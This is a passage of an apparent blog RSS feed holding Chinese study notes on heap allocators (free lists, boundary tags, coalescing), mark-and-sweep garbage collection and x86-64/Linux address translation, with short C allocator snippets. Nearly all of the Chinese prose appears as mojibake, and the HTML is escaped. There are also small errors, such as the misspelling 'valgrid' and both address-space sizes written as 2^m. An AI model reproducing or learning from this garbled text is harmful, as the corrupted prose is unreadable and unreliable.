&lt;p&gt;å¦‚æœæœ‰æ•ˆè½½è·å°äºå—å¤§å°,ç§°ä¸ºå†…éƒ¨ç¢ç‰‡
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207153101.png&quot; alt=&quot;&quot;&gt;
åŸå› :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;åˆ†é…å™¨éœ€è¦ç»´æŠ¤ä¸€ç§å †çš„æ•°æ®ç»“æ„&lt;/li&gt;
&lt;li&gt;å¯¹é½åŸåˆ™:å—ä¸­çš„å¡«å……&lt;/li&gt;
&lt;li&gt;ç­–ç•¥å†³å®š:è¿”å›å¤§å—æ¥ç¡®ä¿å°å—è¯·æ±‚çš„å®‰å…¨&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å–å†³äºè¯­å¥è‡ªèº«,å®¹æ˜“è¯„ä¼°.&lt;/p&gt;
&lt;h3&gt;å¤–éƒ¨ç¢ç‰‡&lt;/h3&gt;
&lt;p&gt;æœ‰è¶³å¤Ÿå¤šçš„å †å†…å­˜,ä½†æ²¡æœ‰ä¸€ä¸ªå—æ˜¯è¶³å¤Ÿå¤§çš„.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207153923.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;å–å†³äºå‰åè¯·æ±‚,éš¾ä»¥è¯„ä¼°.&lt;/p&gt;
&lt;h1&gt;è¿½è¸ªç©ºå—&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;[[#éšå¼ç©ºé—²å—åˆ—è¡¨|éšå¼ç©ºé—²å—åˆ—è¡¨]](implicit list)
 ç”¨é•¿åº¦è¿æ¥æ‰€æœ‰å—.
 &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207161200.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;[[åŠ¨æ€å†…å­˜åˆ†é…(è¿›é˜¶æ¦‚å¿µ)#æ˜¾å¼ç©ºé—²å—åˆ—è¡¨|æ˜¾å¼ç©ºé—²å—åˆ—è¡¨]](explicit list)
 åœ¨ç”¨æŒ‡é’ˆæŒ‡ç¤ºç©ºé—²å—
 &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207161308.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;[[åŠ¨æ€å†…å­˜åˆ†é…(è¿›é˜¶æ¦‚å¿µ)#éš”ç¦»ç©ºé—²å—åˆ—è¡¨|éš”ç¦»ç©ºé—²å—åˆ—è¡¨]](segregated free list)
 å¤šç§ç©ºé—²åˆ—è¡¨,æ¯ä¸ªåŒ…å«ç‰¹å®šå¤§å°æˆ–ç‰¹å®šå¤§å°èŒƒå›´çš„å—&lt;/li&gt;
&lt;li&gt;æŒ‰å¤§å°æ’åˆ—çš„å—
 ä½¿ç”¨å¹³è¡¡æ ‘å°†å—æŒ‰ç…§å¤§å°æ¥æ’åº.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;éšå¼ç©ºé—²å—åˆ—è¡¨&lt;/h2&gt;
&lt;p&gt;ç”±äºå—æŒ‰å­—é•¿å¯¹é½,å­—é•¿é€šå¸¸ä½ä½æœ‰å‡ ä¸ª0,åˆ©ç”¨è¿™äº›0æ¥å­˜å‚¨æ˜¯å¦åˆ†é…çš„ä¿¡æ¯.
åœ¨å—ä¸­åŠ ä¸Šä¸€ä¸ªå¤´éƒ¨,æŒ‡ç¤ºå—çš„å¤§å°/æ˜¯å¦åˆ†é…ç­‰ä¿¡æ¯.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207161049.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207162314.png&quot; alt=&quot;&quot;&gt;
å—çš„å¤´éƒ¨å æœ‰1å­—é•¿,è€Œè½½è·æ˜¯double-wordå†…å­˜å¯¹é½çš„,æ‰€ä»¥å¤´éƒ¨æ²¡æœ‰double-word aligned.ä¸Šå›¾æœ‰æ•ˆè½½è·æ˜¯8å­—èŠ‚å¯¹é½çš„,å­—é•¿æ˜¯4å­—èŠ‚.
ç»“æŸå—æ˜¯1ä¸ª0å­—èŠ‚çš„æœ‰æ•ˆå—.&lt;/p&gt;
&lt;h3&gt;å¯»æ‰¾ç©ºé—²å—çš„ç®—æ³•&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;first fit:
 ä»åˆ—è¡¨å¼€å§‹å¤„å¯»æ‰¾,é€‰æ‹©ç¬¬ä¸€ä¸ªåˆé€‚çš„å—:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;p = start;
while((p &amp;lt; end) &amp;amp;&amp;amp; ((*p &amp;amp; 1) || (*p &amp;lt;= len)))  // åŠ ä¸Šå¤´éƒ¨å¤§å°
    p = p + (*p &amp;amp; -2);  // go to next block
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;next fit:
 ä»ä¸Šæ¬¡æœç´¢ç»“æŸçš„åœ°æ–¹å¼€å§‹æœç´¢
 è™½ç„¶é¿å…äº†ä¸€äº›é‡å¤æœç´¢,ä½†æ˜¯å¯¼è‡´æ›´ä¸¥é‡çš„ç¢ç‰‡åŒ–&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;best fit:
 æœå¯»å †ä¸­æ‰€æœ‰å—,æ‰¾åˆ°æœ€ä½³é€‚é…çš„å—
 éœ€è¦æ›´å¤šçš„æ—¶é—´,ä½†æå‡äº†å†…å­˜åˆ©ç”¨ç‡&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;åœ¨ç©ºé—²å—ä¸­åˆ†é…&lt;/h3&gt;
&lt;p&gt;é€šè¿‡ä¸Šé¢çš„æŸç§æ–¹å¼,å·²ç»æ‰¾åˆ°äº†ä¸€ä¸ªé€‚é…çš„å—.æ¥ä¸‹æ¥æ˜¯å¯¹å®ƒè¿›è¡Œä¿®æ”¹ä»¥è¾¾åˆ°åˆ†é…çš„ç›®çš„.
åœ¨ç©ºé—²å—ä¸­åˆ†é…:åˆ†å‰²
åˆ†é…çš„å¤§å°å¯èƒ½å°äºç©ºé—²çš„å¤§å°,æ‰€ä»¥éœ€è¦åˆ†å‰²
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207164723.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void addblock(ptr p, int len) { 
	int newsize = ((len + 1) &amp;gt;&amp;gt; 1) &amp;lt;&amp;lt; 1;  // round up to even 
	int oldsize = *p &amp;amp; -2;                // mask out low bit 
	*p = newsize | 1;                     // set new length 
	if (newsize &amp;lt; oldsize) 
		*(p+newsize) = oldsize - newsize; // set length in remaining 
}                                         // part of block
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;é‡Šæ”¾å—&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void free_block(ptr p){
	*p = *p &amp;amp; -2;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ä¼šå¯¼è‡´è¶Šæ¥è¶Šå¤šçš„ç¢ç‰‡,æ‰€ä»¥éœ€è¦åˆå¹¶ç©ºé—²å—&lt;/p&gt;
&lt;h3&gt;åˆå¹¶å—&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207171957.png&quot; alt=&quot;&quot;&gt;
ç°æœ‰çš„å¤´éƒ¨è®¾è®¡åªèƒ½åˆå¹¶åé¢çš„ç©ºé—²å—,æ— æ³•åˆ¤æ–­å‰ä¸€ä¸ªå—æ˜¯ç©ºé—².
æ‰€ä»¥åœ¨å—çš„è®¾è®¡ä¸­,åŠ ä¸Šè¾¹ç•Œæ ‡è®°boundary tag,å½¢æˆç±»ä¼¼åŒå‘é“¾è¡¨æ¨¡æ‹Ÿçš„æ•°ç»„:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207170029.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;åˆå¹¶çš„æ—¶é—´å¤æ‚åº¦æ˜¯å¸¸æ•°:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207171729.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç¼ºç‚¹ä¹Ÿæ˜æ˜¾:å¢åŠ äº†å†…éƒ¨ç¢ç‰‡.
å¦‚ä½•ä¼˜åŒ–?
å®é™…ä¸Šåªæœ‰ç©ºé—²å—éœ€è¦è„šæ ‡.ç„¶å,åˆ©ç”¨å­—é•¿ä½ä½çš„å¦ä¸€ä¸ª0æ¥æ ‡å¿—ä¹‹å‰ä¸€ä¸ªå—æ˜¯å¦æ˜¯ç©ºé—²çŠ¶æ€.
å…·ä½“æ¥è¯´,å°±æ˜¯åœ¨é‡Šæ”¾ä¸€å—,å¹¶ä¸”åˆå¹¶åé¢çš„ç©ºé—²å—å,æ•´ä¸ªç©ºé—²å—è®¾ç½®è„šæ ‡,å¹¶å°†ä¸‹ä¸€ä¸ªåˆ†é…å—è®¾ç½®å‰ä¸€ä¸ªå—æ˜¯ç©ºé—²çš„æ ‡è®°.
å½“ä»¥åé‡Šæ”¾å—æ—¶,å°±å¯ä»¥ç›´åˆ°å‰ä¸€ä¸ªå—æ˜¯ç©ºé—²çš„,ç„¶åé€€ä¸€ä¸ªå­—é•¿è®¿é—®å…¶è„šæ ‡,å¾—åˆ°è¿™ä¸ªç©ºé—²å—çš„å¤§å°,å‘å‰åˆå¹¶.&lt;/p&gt;
&lt;h3&gt;åˆ†é…å™¨ç­–ç•¥&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;æ”¾ç½®ç­–ç•¥
  first fit, next fit, best fitä¼šé€ æˆååé‡å’Œç¢ç‰‡ç¨‹åº¦çš„å·®å¼‚,é¡¾æ­¤å¤±å½¼&lt;/li&gt;
&lt;li&gt;åˆ†å‰²ç­–ç•¥
  ç©ºé—²å—å¤§äºåˆ†é…éœ€è¦çš„å¤§å°å°±ä¸€å®šè¦åˆ†å‰²å—?å¦‚æœä¸åˆ†å‰²,å¯èƒ½æå‡æœå¯»çš„æ•ˆç‡,ä½†ä¼šé€ æˆå†…éƒ¨ç¢ç‰‡çš„å¢åŠ .&lt;/li&gt;
&lt;li&gt;åˆå¹¶ç­–ç•¥
  åœ¨è°ƒç”¨&lt;code&gt;free&lt;/code&gt;æ—¶ç«‹å³åˆå¹¶;è¿˜æ˜¯æ¨è¿Ÿåˆå¹¶,åœ¨ä¸‹ä¸€æ¬¡ç”¨&lt;code&gt;malloc&lt;/code&gt;æ‰«æåˆ—è¡¨æ—¶å†åˆå¹¶?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;éšå¼ç©ºé—²åˆ—è¡¨æ˜¯è¿™ä¸­é—´æœ€ç®€å•çš„æ•°æ®ç»“æ„,ç„¶è€Œå·²ç»æœ‰å¦‚æ­¤å¤šéœ€è¦è€ƒé‡çš„ç»†èŠ‚äº†.&lt;/p&gt;
&lt;h3&gt;æ€»ç»“&lt;/h3&gt;
&lt;p&gt;éå¸¸ç®€å•çš„è®¾è®¡,ä½†åˆ†é…æ—¶ä¸å †çš„å¤§å°å‘ˆçº¿æ€§ç›¸å…³å…³ç³».
ä¸ç”¨äº&lt;code&gt;malloc&lt;/code&gt;å’Œ&lt;code&gt;free&lt;/code&gt;å‡½æ•°,å› ä¸ºæ•ˆç‡å¤ªä½äº†.
é€šè¿‡è¿™ç§æ•°æ®ç»“æ„çš„å­¦ä¹ ,æˆ‘ä»¬ç†Ÿæ‚‰äº†ä¸€ç³»åˆ—åŸºæœ¬æ¦‚å¿µå’Œå—çš„è®¾è®¡.&lt;/p&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Thu, 06 Feb 2025 16:00:00 GMT</pubDate></item><item><title>ç¨‹åºä¼˜åŒ–(è¿›é˜¶æ¦‚å¿µ)</title><link>https://www.tankimzeg.top/blog/%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E8%BF%9B%E9%98%B6%E6%A6%82%E5%BF%B5/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E8%BF%9B%E9%98%B6%E6%A6%82%E5%BF%B5/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E8%BF%9B%E9%98%B6%E6%A6%82%E5%BF%B5/&quot;&gt;https://www.tankimzeg.top/blog/%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E8%BF%9B%E9%98%B6%E6%A6%82%E5%BF%B5/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;(ç»­)&lt;/p&gt;
&lt;h2&gt;æ˜¾å¼ç©ºé—²å—åˆ—è¡¨&lt;/h2&gt;
&lt;p&gt;è¿™æ˜¯ä¸€ä¸ªç©ºé—²å—çš„åˆ—è¡¨,è€Œééšå¼åˆ—è¡¨é‚£æ ·çš„æ‰€æœ‰å—çš„åˆ—è¡¨.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207181225.png&quot; alt=&quot;&quot;&gt;
Nextå’ŒPrevéƒ½æ˜¯æŒ‡å‘ç©ºé—²å—çš„æŒ‡é’ˆ.
ä»ç„¶éœ€è¦è„šæ ‡æ¥åˆå¹¶.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207184658.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;åˆ†é…å—&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207184810.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;é‡Šæ”¾å—&lt;/h3&gt;
&lt;p&gt;æ’å…¥ç­–ç•¥:æ–°é‡Šæ”¾çš„å—æ’å…¥åˆ°é“¾è¡¨çš„ä»€ä¹ˆä½ç½®?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ’å…¥é“¾è¡¨ç¬¬ä¸€ä¸ªèŠ‚ç‚¹LIFO:ç®€å•çœäº‹,ä½†ç¢ç‰‡åŒ–æ¯”æŒ‰åœ°å€æ’åºä¸¥é‡&lt;/li&gt;
&lt;li&gt;æŒ‰åœ°å€æ’åº:addr(prev) &amp;lt; addr(curr) &amp;lt; addr(next)
  éœ€è¦æœç´¢&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;LIFO&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207171729.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Case 1
 &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207233408.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Case 2
 &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207233454.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Case 3
 &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207233645.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Case 4
 &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207233712.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;æ€»ç»“&lt;/h3&gt;
&lt;p&gt;ç°åœ¨,åˆ†é…æ—¶é—´æ˜¯ç©ºé—²å—æ•°é‡å‘ˆçº¿æ€§ç›¸å…³å…³ç³»è€Œä¸æ˜¯å †çš„å¤§å°.
åˆå¹¶ æ“ä½œæ¯”è¾ƒå¤æ‚,ä¹Ÿéœ€è¦é¢å¤–çš„å¼€é”€.
ä¸è¶³ä»¥é«˜æ•ˆçš„é€šç”¨äºç°å®åˆ†é…å™¨.
ç»´æŠ¤å¤šç§å¤§å°çš„ç©ºé—²åˆ—è¡¨,æ¯ä¸ªåˆ—è¡¨éƒ½æ˜¯ä¸€ä¸ªæ˜¾å¼åˆ—è¡¨.&lt;/p&gt;
&lt;h2&gt;éš”ç¦»ç©ºé—²å—åˆ—è¡¨&lt;/h2&gt;
&lt;p&gt;æ¯ç±»å°ºå¯¸çš„å—å¤§å°éƒ½æœ‰è‡ªå·±çš„ç©ºé—²åˆ—è¡¨
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250208000254.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;åˆ†é…å¤§å°ä¸ºnçš„å—&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;æœå¯»åˆé€‚å¤§å°çš„å—åˆ—è¡¨m&amp;gt;n&lt;/li&gt;
&lt;li&gt;å¦‚æœæ‰¾åˆ°åˆé€‚çš„å—,åˆ†å‰²å¹¶æ”¾ç½®ç¢ç‰‡åˆ°åˆé€‚çš„åˆ—è¡¨é‡Œ(å¯é€‰)&lt;/li&gt;
&lt;li&gt;å¦‚æœæ‰¾ä¸åˆ°,å°è¯•æ›´å¤§å—ç±»&lt;/li&gt;
&lt;li&gt;å¦‚æœæœ€åæ‰¾ä¸åˆ°,å‘æ“ä½œç³»ç»Ÿè¯·æ±‚å¢åŠ å †(è°ƒç”¨&lt;code&gt;sbrk()&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;é‡Šæ”¾å—:&lt;/h3&gt;
&lt;p&gt;åˆå¹¶,æ”¾åˆ°åˆé€‚çš„åˆ—è¡¨ä¸­&lt;/p&gt;
&lt;h3&gt;ä¼˜ç‚¹&lt;/h3&gt;
&lt;p&gt;é«˜ååé‡,é«˜å†…å­˜åˆ©ç”¨ç‡&lt;/p&gt;
&lt;h1&gt;åƒåœ¾å›æ”¶æœºåˆ¶&lt;/h1&gt;
&lt;p&gt;è‡ªåŠ¨å›æ”¶å †åˆ†é…çš„ç©ºé—´,åº”ç”¨ä¸ç”¨è°ƒç”¨&lt;code&gt;free&lt;/code&gt;å‡½æ•°.
å†…å­˜ç®¡ç†å™¨å¦‚ä½•çŸ¥é“å†…å­˜ä½•æ—¶å¯ä»¥è¢«é‡Šæ”¾?
å°†å†…å­˜è§†ä¸ºæœ‰å‘å›¾
ä¸åœ¨å †ä¸­ä½†åŒ…å«æŒ‡å‘å †çš„æŒ‡é’ˆå«åšæ ¹èŠ‚ç‚¹(å¯„å­˜å™¨/æ ˆ/å…¨å±€å˜é‡).
æŒ‡é’ˆæ˜¯å›¾çš„è¾¹,å—æ˜¯å›¾çš„èŠ‚ç‚¹.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250208002600.png&quot; alt=&quot;&quot;&gt;
å¦‚æœå­˜åœ¨ä»æ ¹èŠ‚ç‚¹åˆ°èŠ‚ç‚¹çš„è·¯å¾„,è¯¥èŠ‚ç‚¹å°±æ˜¯å¯è¾¾çš„.
ä¸å¯è¾¾çš„èŠ‚ç‚¹æ˜¯åƒåœ¾.&lt;/p&gt;
&lt;h2&gt;æ ‡è®°æ¸…æ‰«æ”¶é›†(Mark and Sweep Collection)&lt;/h2&gt;
&lt;p&gt;å½“ç©ºé—´è€—å°½å:
åœ¨æ¯ä¸ªå—çš„å¤´éƒ¨è®¾ç½®é¢å¤–çš„æ ‡è®°ä½:ä»æ ¹èŠ‚ç‚¹å¼€å§‹,æ ‡è®°æ¯ä¸€ä¸ªå¯è¾¾å—.å†æ¬¡æ‰«ææ‰€æœ‰å—,å°†ä¸å¯è¾¾çš„å—é‡Šæ”¾.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250208003722.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;å†…å­˜ç›¸å…³çš„å±é™©&lt;/h1&gt;
&lt;p&gt;æŠŠå˜é‡å½“æˆæŒ‡é’ˆ,è¯»å–æœªåˆå§‹åŒ–æ•°æ®,è¦†å†™å†…å­˜,æ‚¬ç©ºæŒ‡é’ˆå¤šæ¬¡é‡Šæ”¾æŒ‡é’ˆå†…å­˜æ³„æ¼&lt;/p&gt;
&lt;h2&gt;å¤„ç†å†…å­˜Bug&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;è°ƒè¯•å™¨:GDB&lt;/li&gt;
&lt;li&gt;æ•°æ®ç»“æ„ä¸€è‡´æ€§æ£€æŸ¥å™¨
  é™é»˜è¿è¡Œ,å‡ºé”™æ—¶æ‰“å°é”™è¯¯&lt;/li&gt;
&lt;li&gt;valgrid:äºŒåˆ†æ£€æŸ¥&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setenv MALLOC_CHECK_ 3&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Thu, 06 Feb 2025 16:00:00 GMT</pubDate></item><item><title>è™šæ‹Ÿå†…å­˜(ç³»ç»Ÿ)</title><link>https://www.tankimzeg.top/blog/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%B3%BB%E7%BB%9F/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%B3%BB%E7%BB%9F/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%B3%BB%E7%BB%9F/&quot;&gt;https://www.tankimzeg.top/blog/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%B3%BB%E7%BB%9F/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;Intel x86-64 i7/Linuxå†…å­˜ç³»ç»Ÿ&lt;/h1&gt;
&lt;p&gt;i7å¤„ç†å™¨æ¶æ„:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206172220.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;ç¬¦å·:&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;åŸºæœ¬é‡&lt;ul&gt;
&lt;li&gt;$N=2^m$:è™šæ‹Ÿåœ°å€ç©ºé—´&lt;/li&gt;
&lt;li&gt;$M=2^m$:ç‰©ç†åœ°å€ç©ºé—´&lt;/li&gt;
&lt;li&gt;$P=2^p$:é¡µå¤§å°(å­—èŠ‚)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;è™šæ‹Ÿåœ°å€(VA)ç»„æˆ&lt;ul&gt;
&lt;li&gt;TLBI:TLBç´¢å¼•&lt;/li&gt;
&lt;li&gt;TLBT:TLB tag&lt;/li&gt;
&lt;li&gt;VPO:è™šæ‹Ÿé¡µåç§»é‡&lt;/li&gt;
&lt;li&gt;VPN:è™šæ‹Ÿé¡µç &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ç‰©ç†åœ°å€(PA)ç»„æˆ&lt;ul&gt;
&lt;li&gt;PPO:ç‰©ç†åœ°å€åç§»é‡(ç­‰äºVPO)&lt;/li&gt;
&lt;li&gt;PPN:ç‰©ç†é¡µç &lt;/li&gt;
&lt;li&gt;CO:ç¼“å­˜è¡Œä¸­çš„åç§»é‡&lt;/li&gt;
&lt;li&gt;CI:ç¼“å­˜ç´¢å¼•&lt;/li&gt;
&lt;li&gt;CT:ç¼“å­˜tag&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;åœ°å€ç¿»è¯‘&lt;/h2&gt;
&lt;p&gt;ä¸‹å›¾æŠŠæ•´ä¸ªåœ°å€ç¿»è¯‘è¿‡ç¨‹æè¿°å¾—éå¸¸æ¸…æ™°:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206173424.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;ç¬¬1~3çº§PTE&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206174113.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;P: Child page table present in physical memory (1) or not (0).&lt;/li&gt;
&lt;li&gt;R/W: Read-only or read-write access access permission for all reachable pages.&lt;/li&gt;
&lt;li&gt;U/S: user or supervisor (kernel) mode access permission for all reachable pages.&lt;/li&gt;
&lt;li&gt;WT: Write-through or write-back cache policy for the child page table&lt;/li&gt;
&lt;li&gt;A: Reference bit (set by MMU on reads and writes, cleared by socware).&lt;/li&gt;
&lt;li&gt;PS: Page size either 4 KB or 4 MB (defined for Level 1 PTEs only).&lt;/li&gt;
&lt;li&gt;Page table physical base address: 40 most significant bits of physical page table address (forces page tables to be 4KB aligned)&lt;/li&gt;
&lt;li&gt;XD: Disable or enable instruc;on fetches from all pages reachable from this PTE.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;ç¬¬4çº§PTE&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206175028.png&quot; alt=&quot;&quot;&gt;
ä¸å†æ˜¯ä¸‹ä¸€çº§çš„é¡µè¡¨åŸºå€,è€Œæ˜¯é¡µçš„ç‰©ç†åœ°å€.
ç¬¬6ä½å’Œç¬¬7ä½æœ‰å˜åŒ–:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;D: Dirty bit (set by MMU on writes, cleared by socware)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;é¡µè¡¨ç¿»è¯‘&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206175410.png&quot; alt=&quot;&quot;&gt;
å·²ç»å¤šæ¬¡å‘ˆç°.&lt;/p&gt;
&lt;h2&gt;åŠ é€ŸL1å†…å­˜è®¿é—®&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206182631.png&quot; alt=&quot;&quot;&gt;
ç”±äºVPOå’ŒPPOæ˜¯ä¸€æ ·çš„,åœ¨è¿›è¡Œåœ°å€ç¿»è¯‘çš„åŒæ—¶,æŠŠVPOå‘é€ç»™L1ç¼“å­˜,å°±å¯ä»¥å…ˆå¯¹tagä½è¿›è¡Œç­›é€‰,ç­›é€‰çš„ç»“æœä¸åœ°å€ç¿»è¯‘çš„ç»“æœç»“åˆ,ä»è€ŒåŠ é€Ÿäº†ç¼“å­˜æŸ¥æ‰¾.&lt;/p&gt;
&lt;h2&gt;Linuxè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206183123.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!think]
ä¸ºä»€ä¹ˆè¦æœ‰kernel virtual memory?è¿™å—ä¸æ˜¯å¾ˆæ‡‚.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Linuxç³»ç»Ÿå°†è™šæ‹Ÿå†…å­˜ç»„ç»‡æˆä¸€å—ä¸€å—çš„åŒºåŸŸ:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206184609.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ä¸‰ç§å¼‚å¸¸:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206184855.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Segmentation fault:è®¿é—®ä¸å­˜åœ¨çš„é¡µ,ä¸åœ¨vm_startå’Œvm_endåŒºé—´å†….&lt;/li&gt;
&lt;li&gt;Prtection exception:è¿åäº†æƒé™(LinuxæŠ¥Segmentation fault).&lt;/li&gt;
&lt;li&gt;æ­£å¸¸çš„é¡µé”™è¯¯.&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;å†…å­˜æ˜ å°„&lt;/h1&gt;
&lt;p&gt;è™šæ‹Ÿå†…å­˜çš„åŒºåŸŸåˆå§‹åŒ–çš„æ—¶å€™,å’Œç£ç›˜ä¸Šçš„å¯¹è±¡å…³è”èµ·æ¥,è¿™ä¸ªè¿‡ç¨‹å«åšå†…å­˜æ˜ å°„.
åˆå§‹åŒ–çš„å†…å®¹æ¥è‡ªé‚£ä¸ªæ–‡ä»¶,å°†å…¶å¤åˆ¶åˆ°å†…å­˜.æ–‡ä»¶å¯ä»¥æ˜¯:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç£ç›˜ä¸Šçš„å¸¸è§„æ–‡ä»¶.å¦‚å¯æ‰§è¡Œæ–‡ä»¶.
